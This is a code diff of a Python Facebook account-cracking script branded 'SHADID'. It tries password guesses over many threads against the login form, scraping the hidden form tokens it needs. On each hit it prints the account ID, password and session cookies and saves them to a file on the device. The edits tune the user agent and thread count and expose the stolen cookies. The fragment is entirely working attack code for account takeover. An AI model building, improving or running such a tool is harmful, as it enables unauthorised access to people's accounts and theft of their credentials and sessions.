@@ -68,7 +68,7 @@ oks = []
 
 # ----------CK Update----------#
 
-agent = "Mozilla/5.0 (Linux; Android 12; CPH2095 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.178 Mobile Safari/537.36"
+agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.143 YaBrowser/22.5.0.1843 Yowser/2.5 Safari/537.36"
 # -----GRAPH
 
 
@@ -116,7 +116,7 @@ def main():
         fb = "free"
     else:
         fb = "m"
-    with ThreadPool(max_workers=20) as update:
+    with ThreadPool(max_workers=10) as update:
     	
     	
         clear()
@@ -135,7 +135,7 @@ def main():
 def host(uid, pwx, meth, fb):
     global oks, loop, user
     session = requests.Session()
-    sys.stdout.write(f"\r  \x1b[38;1;155m\x1b[38;5;155m[SHADID-M{meth}]   {loop}⟩\x1b[38;5;155m{str(len(user))}\r "),
+    sys.stdout.write(f"\r  \x1b[38;1;155m\x1b[38;5;155m[SHADID-M{meth}]   {loop} • \x1b[38;5;155m{str(len(user))}  • {str(len(oks))}"),
     sys.stdout.flush()
 
     try:
@@ -146,7 +146,7 @@ def host(uid, pwx, meth, fb):
                     "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                     "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1), "try_number": "0",
                     "unrecognized_tries": "0", "email": uid, "pass": ps, "login": "Log In"}
-            uax = ua()
+            uax = agent 
             ver1 = str(random.randrange(1, 99))
             ver2 = str(random.randrange(90, 121))
             lsd = lsb()
@@ -186,7 +186,8 @@ def host(uid, pwx, meth, fb):
                     coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                     xx = coki.split("c_user=")[1]
                     xd = xx[:15].replace(";", "  ")
-                    print(f"\r\r[SHADID-OK] {xd} <> {ps}\n")  #[Cookies]{coki}
+                    oks.append(xd)
+                    print(f"\r\r[SHADID-OK] {xd} <> {ps}\n[Cookies]{coki}")  
                     open("/sdcard/SHADID-OK.txt", "a").write(xd + "|" + ps + "|" + coki + "\n")
                     break
                     
